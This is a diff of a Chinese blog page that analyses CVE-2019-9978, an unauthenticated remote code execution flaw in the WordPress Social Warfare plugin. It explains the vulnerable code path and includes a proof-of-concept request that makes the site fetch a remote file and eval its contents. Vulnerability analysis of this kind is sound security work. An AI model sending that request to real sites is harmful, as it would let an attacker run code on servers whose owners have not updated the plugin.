@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>WordPress-Social-Warfare远程代码执行漏洞分析 · fi3ework&#39;s Studio</title>
+    <title>WordPress-Social-Warfare远程代码执行漏洞分析 · 熊本熊本熊&#39;s Studio</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -187,7 +187,7 @@
 }( typeof global !== "undefined" ? global : this ) );
 </script>
 
-    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="icon" href="/assets/avatar.ico">
     <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
     <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
     <link rel="preload" href="/scripts/main.js" as="script">
@@ -214,14 +214,14 @@
     
     <div class="banner">
             <div class="blog-title">
-                <a href="/" >fi3ework&#39;s Studio.</a>
+                <a href="/" >熊本熊本熊&#39;s Studio.</a>
             </div>
             <div class="post-title">
                 <a href="#" class="post-name">WordPress-Social-Warfare远程代码执行漏洞分析</a>
             </div>
     </div>
     
-    <a class="home-link" href=/>fi3ework's Studio.</a>
+    <a class="home-link" href=/>熊本熊本熊's Studio.</a>
 </header>
     <div class="wrapper">
         <div class="site-intro" style="
@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">2k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.8k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -402,125 +402,103 @@ height:50vh;
             <main class="main post-page">
     <article class="article-entry">
         <hr>
-<h1>一、背景介绍</h1>
+<div align="center"><img src="/WordPress-Social-Warfare-Rce/1.png"></div>
 
-<p>social-warfare是一款 WordPress社交分享按钮插件。 不同于大多数WordPress社交分享插件，social-warfar最大的优势在于其轻便性与高效性。它不会像其他共享插件一样减慢网站速度，这也是很多用户使用其作为自己网站社交分享插件的原因。</p>
-<p>该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量</p>
-<p>social-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞。</p>
+<p>social-warfare是一款 WordPress社交分享按钮插件。 该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量</p>
+<p>social-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞</p>
 <a id="more"></a>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9cab96ac7dc5a8c199faa4cea800d35b.png"></p>
-<h2>1.1漏洞描述</h2>
-
-<p>social-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞。</p>
+<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>social-warfare是一款 WordPress社交分享按钮插件。 不同于大多数WordPress社交分享插件，social-warfar最大的优势在于其轻便性与高效性。它不会像其他共享插件一样减慢网站速度，这也是很多用户使用其作为自己网站社交分享插件的原因。</p>
+<p>该插件被wordpress用户广泛的应用： 从官网看，该插件官方的统计是超过90万的下载量</p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9cab96ac7dc5a8c199faa4cea800d35b.png" alt></p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>social-warfare &lt;= 3.5.2版本中，程序没有对传入参数进行严格控制以及过滤，导致攻击者可构造恶意payload，无需后台权限，直接造成远程命令执行漏洞。</p>
 <p>攻击成功的条件只需要如下两条：</p>
-<ul><br><ul><br><ul><br>    <li>目标wordpress站点上安装有social-warfare</li><br>    <li>social-warfare插件的版本小于或等于3.5.2</li><br></ul><br></ul><br></ul>
-
 <p>只要符合以上两个条件，无需复杂的payload构造，即可通过简简单单的一个get请求，远程执行任意代码。<br>与wordpress自身漏洞修补不同，对于插件的漏洞，wordpress并不会在后台对该插件进行自动升级，仅仅是提示有新版本可用。</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f09cfb9a4bf7ca3a89624bbdab4ece3a.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f09cfb9a4bf7ca3a89624bbdab4ece3a.png" alt></p>
 <p>简言之，由于该机制的存在，目前还有大部分使用该插件的站长，所使用着仍存在漏洞版本的social-warfare插件，面临着被攻击的风险。</p>
 <p>与此同时，这个漏洞，还是一个洞中洞，开发者的一连串失误，将该漏洞威胁等级逐步增高。</p>
 <p>&nbsp;</p>
-<h2>1.2受影响的系统版本</h2>
-
-<p>social-warfare&lt;= 3.5.2</p>
+<h2 id="受影响的系统版本"><a href="#受影响的系统版本" class="headerlink" title="受影响的系统版本"></a>受影响的系统版本</h2><p>social-warfare&lt;= 3.5.2</p>
 <p>&nbsp;</p>
-<h2>1.3.漏洞编号</h2>
-
-<p>CVE-2019-9978</p>
+<h2 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h2><p>CVE-2019-9978</p>
 <p>&nbsp;</p>
-<h1>二、漏洞细节</h1>
-
-<p>social-warfare安装后如下图</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/6cea63341fcc7d1afae9189460553fb4.png"></p>
+<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h1><p>social-warfare安装后如下图</p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/6cea63341fcc7d1afae9189460553fb4.png" alt></p>
 <p>如图中红框所见，该插件提供了一个简洁易用的分享功能栏。</p>
 <p>首先，通过github的commit记录，找到漏洞触发点</p>
 <p>漏洞触发点位于/wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php中的debug_parameters方法中</p>
 <p>首先分析下debug_parameters方法</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a7ba07b0bc7379abc39d0dc734bef4d.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a7ba07b0bc7379abc39d0dc734bef4d.png" alt></p>
 <p>该方法提供了一种允许更容易调试数据库迁移功能的方法。</p>
 <p>先来看下get_user_options功能的代码块</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/4e04fc9b7265e54c0e15a3635fc5874b.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/4e04fc9b7265e54c0e15a3635fc5874b.png" alt></p>
 <p>此处功能模块加载wp-content/plugins/social-warfare-3.5.2/lib/utilities/SWP_Database_Migration.php 中initialize_database方法中的$defaults数组中的配置信息，如下图</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/19b94966c0e303f8164286461e0338e2.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/19b94966c0e303f8164286461e0338e2.png" alt></p>
 <p>在访问与执行该功能模块后，返回相应的配置信息</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/fcd76e490cc82b1d1ca222c7fc4727b7.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/fcd76e490cc82b1d1ca222c7fc4727b7.png" alt></p>
 <p>接下来分析漏洞触发点 位于如下图中的if分支中</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/34a240e81557704f1c9745d6080e23ad.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/34a240e81557704f1c9745d6080e23ad.png" alt></p>
 <p>也就是在’load_options’这个功能模块中。该功能模块，是开发者用来调试数据库迁移功能的，在对用户实现实际的业务功能中，该模块并没有被使用过。</p>
 <p>逐行分析下此功能模块 首先，可以看到如下图代码块:</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png" alt></p>
 <p>如红框中所见，这里的代码看起来，需要通过is_admin()方法的校验。看起来，这里需要有admin权限才可以执行后续代码触发漏洞。按照以往经验，这是一个需要后台权限才可以代码执行的漏洞（但这里的推测并不正确，具体的见下文分析）</p>
 <p>紧接着，通过file_get_contents方法，发送请求</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/17cbe28ee96c48c8baab35742002bf3d.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/17cbe28ee96c48c8baab35742002bf3d.png" alt></p>
 <p>其中的$_GET[‘swp_url’]我们可控，例如：</p>
 <p><a href="http://127.0.0" target="_blank" rel="noopener">http://127.0.0</a></p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0594cb2ffa6f8a291c0ba8d41e1e5668.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0594cb2ffa6f8a291c0ba8d41e1e5668.png" alt></p>
 <p>这样file_get_contents会访问 <a href="http://127.0.0.1/1.php?swp_debug=get_user_options，并将我们构造好的payload传递给$options变量" target="_blank" rel="noopener">http://127.0.0.1/1.php?swp_debug=get_user_options，并将我们构造好的payload传递给$options变量</a> 到此为止，我们通过构造链接传入file_get_contents，达到完全可控$options变量中的内容的目的</p>
 <p>接下来，会从$options变量中提取出内容，并进行解析，如下图</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/bded25e5da4ccfa0f16d614b52548839.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/bded25e5da4ccfa0f16d614b52548839.png" alt></p>
 <p>随后，将解析出的$options值拼接后赋予$array，如使用我们案例中的1.php,那么$array的值为：return phpinfo()</p>
 <p>接下来，$array中的值会传递入eval中，造成代码执行</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/dd061c81db5e40245e4458ff5f8bc8ba.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/dd061c81db5e40245e4458ff5f8bc8ba.png" alt></p>
 <p>实际效果如下图</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/66a4b42781354e24b2cde9e630f51bb1.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/66a4b42781354e24b2cde9e630f51bb1.png" alt></p>
 <p>漏洞分析到此结束，本次漏洞影响很大，但漏洞自身没有什么亮点</p>
 <p>接下来，看一下官方是如何修补的：</p>
 <p>通过github的commit记录，获取此次的修补方案。</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/a134e944bfa46ae34edb4d687d33f597.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/a134e944bfa46ae34edb4d687d33f597.png" alt></p>
 <p>此次修补，将lib/utilities/SWP_Database_Migration.php中的221-284行，将debug_parameters方法中存在问题的load_options模块代码全部删除 所以不存在绕过补丁的可能性。</p>
 <p>在分析此漏洞时，有几处有意思的地方，和大家分享一下：</p>
-<h3>思考一：</h3>
-
-<p>先来看下如下操作：</p>
+<h3 id="思考一："><a href="#思考一：" class="headerlink" title="思考一："></a>思考一：</h3><p>先来看下如下操作：</p>
 <p>首先，我们退出wordpress登陆</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0dba144a1bc952bc4cda36f0cce39b6c.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0dba144a1bc952bc4cda36f0cce39b6c.png" alt></p>
 <p>可见，此时我们并没有登陆，也没有admin权限</p>
 <p>接着，我们访问poc</p>
 <p><a href="http://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php" target="_blank" rel="noopener">http://127.0.0.1/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php</a></p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/650252922e64b757e1d7c89b063cc305.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/650252922e64b757e1d7c89b063cc305.png" alt></p>
 <p>payload仍然可以触发</p>
 <p>回顾上文此处</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9a74d7ee9fd35b14d8f9ef267f87fd38.png" alt></p>
 <p>在漏洞分析环节，我们的猜测是，由于is_admin方法的校验，此处应该是后台漏洞，但是在没有登陆的情况下，仍然触发了。</p>
 <p>这是为什么呢？</p>
 <p>原因如下： 先来看看is_admin方法是如何实现的</p>
 <p>位于/wp-includes/load.php中</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/de06cb5281ce8f86eff50fab3c185a22.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/de06cb5281ce8f86eff50fab3c185a22.png" alt></p>
 <p>可以看到，有一个if-elseif判断</p>
 <p>在elseif中判断defined (‘WP_ADMIN’)的值</p>
 <p>由于我们构造的payload，入口是admin-post.php</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0fed2e5c53e4edde5b9d93f2048793d6.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/0fed2e5c53e4edde5b9d93f2048793d6.png" alt></p>
 <p>看一下admin-post.php 第3行将WP_ADMIN定义为true</p>
 <p>也就是说，is_admin方法，检查的是：此时运行时常量WP_ADMIN的值是否为true。</p>
 <p>在wordpress中，WP_ADMIN只是用来标识该文件是否为后台文件。大多数后台文件，都会在脚本中定义WP_ADMIN为true(例如wp-admin目录下的admin-post.php等)， 因此is_admin方法检测通过时，只能说明此是通过后台文件作为入口，调用debug_parameters方法，并不能有效的验证此时访问者的身份是否是admin</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/33f902eec67376c6d25e3d0dd6a9fb5f.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/33f902eec67376c6d25e3d0dd6a9fb5f.png" alt></p>
 <p>前台index.php无法触发</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f4c0cca46dd5d5fc3b030c0551588024.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f4c0cca46dd5d5fc3b030c0551588024.png" alt></p>
 <p>wp-admin目录下的about.php可以触发</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/2cc7e92daa9871394958530b342e44df.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/2cc7e92daa9871394958530b342e44df.png" alt></p>
 <p>可见，wp-admin下任意文件为入口，都可以触发该漏洞，也就是说，在构造payload以及进行防护时，需要注意</p>
 <p><a href="http://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php" target="_blank" rel="noopener">http://127.0.0.1/wordpress/wp-admin/[xxx].php?swp_debug=load_options&amp;swp_url=http://127.0.0.1/1.php</a></p>
 <p>这里xxx可以是绝大多数后台php文件</p>
-<h3>思考二：</h3>
-
-<p>访问<a href="http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options" target="_blank" rel="noopener">http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options</a> 时，是如何将get请求中的swp_debug=get_user_options与get_user_options功能模块关联起来，调用此功能模块执行相应的功能呢？</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/c63a5db2ef1357c6fb1c0c176eb5195f.png"></p>
+<h3 id="思考二："><a href="#思考二：" class="headerlink" title="思考二："></a>思考二：</h3><p>访问<a href="http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options" target="_blank" rel="noopener">http://127.0.0.1/wordpress/index.php?swp_debug=get_user_options</a> 时，是如何将get请求中的swp_debug=get_user_options与get_user_options功能模块关联起来，调用此功能模块执行相应的功能呢？</p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/c63a5db2ef1357c6fb1c0c176eb5195f.png" alt></p>
 <p>同理，当访问<a href="http://127.0.0.1/wordpress/index.php?swp_debug=load_options" target="_blank" rel="noopener">http://127.0.0.1/wordpress/index.php?swp_debug=load_options</a> 时，后台是如何解析get请求，并找到load_options模块的？</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9d224e3ea0e9aff4641c2f37250366e1.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/9d224e3ea0e9aff4641c2f37250366e1.png" alt></p>
 <p>开始的时候，笔者以为是有相关的路由配置(类似于django中的url解析)，或者说是类似MVC结构中的控制器（类似thinkphp中的url普通模式<a href="http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value）这样的结构，但实际真相很简单：" target="_blank" rel="noopener">http://localhost/?m=home&amp;c=user&amp;a=login&amp;var=value）这样的结构，但实际真相很简单：</a></p>
 <p>见下图，SWP_Utility::debug方法</p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/d8e014b47e8d8c511fb6f6ef359efe43.png"></p>
-<p><img alt src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f416a39a73e5de93a96b836bf844b57a.png"></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/d8e014b47e8d8c511fb6f6ef359efe43.png" alt></p>
+<p><img src="http://alphalab1-wordpress.stor.sinaapp.com/uploads/2019/05/f416a39a73e5de93a96b836bf844b57a.png" alt></p>
 <p>在debug_parameters方法中的所有if分支中逐个执行debug方法，逐个将debug方法内注册的值（’load_options’、’get_user_options’等）和get请求中swp_debug的值进行比较，如果一样，则执行该功能模块的代码，如果不一样，则进入下个if中。道理同等于switch</p>
-<h3>回顾：</h3>
-
-<p>此次漏洞，粗看很无趣，细看很有意思</p>
-<p><ul></ul></p>
-<p><ul></ul></p>
-<p><ul><br>    <li>首先，传入file_get_contents中内容没有被限制，导致可以访问任意网址</li><br>    <li>其次，file_get_contents返回结果，没有经过任何过滤，直接被eval执行</li><br>    <li>最终，is_admin方法，本来应该将此漏洞限制在后台，但错误的权限控制，导致无需后台权限的代码执行，而且，开发者根本不改，直接删除功能模块了事</li><br></ul><br><br></p>
-<h1>三、修复建议</h1>
-
-<p>目前官方已修复该漏洞，可从官网下载最新版本。由于官方已经将存在漏洞的代码段彻底删除，不存在后续补丁绕过等问题。</p>
 
     </article>
     <!-- license  -->
@@ -529,7 +507,7 @@ height:50vh;
             <p>原文作者：<a href="https://gingsguard.github.io">Gings guard</a>
             <p>原文链接：<a href="https://gingsguard.github.io/WordPress-Social-Warfare-Rce/">https://gingsguard.github.io/WordPress-Social-Warfare-Rce/</a>
             <p>发表日期：<a href="https://gingsguard.github.io/WordPress-Social-Warfare-Rce/">September 24th 2019, 5:49:58 pm</a>
-            <p>更新日期：<a href="https://gingsguard.github.io/WordPress-Social-Warfare-Rce/">September 24th 2019, 5:52:32 pm</a>
+            <p>更新日期：<a href="https://gingsguard.github.io/WordPress-Social-Warfare-Rce/">September 24th 2019, 6:29:11 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -573,7 +551,7 @@ height:50vh;
     
         
             
-                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
+                <a href="mailto:419512425@qq.com" class="iconfont-archer email" title=email ></a>
             
         
     
@@ -661,7 +639,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">一、背景介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.1.</span> <span class="toc-text">1.1漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.2.</span> <span class="toc-text">1.2受影响的系统版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.3.</span> <span class="toc-text">1.3.漏洞编号</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">二、漏洞细节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.0.1.</span> <span class="toc-text">思考一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.0.2.</span> <span class="toc-text">思考二：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#null"><span class="toc-number">2.0.3.</span> <span class="toc-text">回顾：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#null"><span class="toc-number">3.</span> <span class="toc-text">三、修复建议</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#背景介绍"><span class="toc-number">1.</span> <span class="toc-text">背景介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞描述"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#受影响的系统版本"><span class="toc-number">1.2.</span> <span class="toc-text">受影响的系统版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞编号"><span class="toc-number">1.3.</span> <span class="toc-text">漏洞编号</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞细节"><span class="toc-number">2.</span> <span class="toc-text">漏洞细节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#思考一："><span class="toc-number">2.0.1.</span> <span class="toc-text">思考一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思考二："><span class="toc-number">2.0.2.</span> <span class="toc-text">思考二：</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -674,6 +652,8 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
     
     
     
@@ -811,13 +791,13 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="杂文"><span class="iconfont-archer">&#xe606;</span>杂文</span>
-    
-        <span class="sidebar-tag-name" data-tags="wikiHow"><span class="iconfont-archer">&#xe606;</span>wikiHow</span>
-    
         <span class="sidebar-tag-name" data-tags="web漏洞分析"><span class="iconfont-archer">&#xe606;</span>web漏洞分析</span>
     
+        <span class="sidebar-tag-name" data-tags="杂文"><span class="iconfont-archer">&#xe606;</span>杂文</span>
+    
         <span class="sidebar-tag-name" data-tags="技术分享"><span class="iconfont-archer">&#xe606;</span>技术分享</span>
+    
+        <span class="sidebar-tag-name" data-tags="wikiHow"><span class="iconfont-archer">&#xe606;</span>wikiHow</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -852,9 +832,9 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="日常"><span class="iconfont-archer">&#xe60a;</span>日常</span>
-    
         <span class="sidebar-category-name" data-categories="技术"><span class="iconfont-archer">&#xe60a;</span>技术</span>
+    
+        <span class="sidebar-category-name" data-categories="日常"><span class="iconfont-archer">&#xe60a;</span>日常</span>
     
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
